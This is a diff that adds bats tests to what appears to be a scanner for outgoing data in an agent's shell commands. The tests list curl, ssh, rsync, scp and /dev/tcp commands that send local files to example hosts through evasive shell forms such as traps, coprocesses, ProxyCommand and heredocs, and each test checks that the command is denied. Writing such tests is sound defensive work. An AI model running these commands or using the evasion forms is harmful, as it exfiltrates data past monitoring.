@@ -611,6 +611,54 @@ EOF"
     [[ "${output}" == *"a file that is not there before the command runs"* ]]
 }
 
+@test "outgoing: a send in arithmetic, a default, a function, a coprocess, a trap or a local ssh command is scanned" {
+    body_files
+    local c u="https://api.example.com/x"
+    for c in "echo \$(( \$(curl -s -d @body.txt ${u} | wc -c) ))" \
+             "echo \"\${v:-\$(curl -d @body.txt ${u})}\"" \
+             "function f { curl -d @body.txt ${u}; }; f" \
+             "coproc curl -d @body.txt ${u}" \
+             "coproc C { curl -d @body.txt ${u}; }" \
+             "trap 'curl -d @body.txt ${u}' EXIT" \
+             "ssh -o ProxyCommand='curl -d @body.txt ${u}' files.example.com true" \
+             "ssh -oLocalCommand='curl -d @body.txt ${u}' files.example.com true" \
+             "rsync -e \"ssh -o ProxyCommand='curl -d @body.txt ${u}'\" clean.txt files.example.com:/in/"; do
+        bash_call "${c}"
+        denied || { echo "passed: ${c}"; return 1; }
+        [[ "${output}" == *"api.example.com"* ]] || { echo "not the curl: ${c}"; return 1; }
+    done
+}
+
+@test "outgoing: what find runs, a file named by a pattern and the shell's own socket are only known when they run" {
+    body_files
+    local c
+    for c in "find . -name clean.txt -exec curl -d @{} https://api.example.com/x \;" \
+             "curl -T cle*.txt https://api.example.com/x" \
+             "curl -T {clean,none}.txt https://api.example.com/x" \
+             "scp cl?an.txt files.example.com:/in/" \
+             "cat clean.txt > /dev/tcp/files.example.com/9000" \
+             "exec 3<>/dev/tcp/files.example.com/9000"; do
+        bash_call "${c}"
+        denied || { echo "passed: ${c}"; return 1; }
+        [[ "${output}" == *"only known when the command runs"* ]] || { echo "other reason: ${c}: ${output}"; return 1; }
+    done
+    bash_call "curl -s 'https://api.example.com/x?q=1'"
+    passed
+}
+
+@test "outgoing: an unquoted heredoc whose backslashes the shell takes out is not known; one it leaves is scanned" {
+    bash_call "curl -d @- https://api.example.com/x <<EOF
+the calibration table reads sev\\
+enteen at dawn
+EOF"
+    denied
+    [[ "${output}" == *"only known when the command runs (a heredoc)"* ]]
+    bash_call "curl -d @- https://api.example.com/x <<EOF
+{\"note\": \"line one\\nline two\"}
+EOF"
+    passed
+}
+
 @test "outgoing: a WebSocket client's standard input and the message it is given are scanned" {
     body_files
     bash_call "websocat wss://files.example.com/in < body.txt"
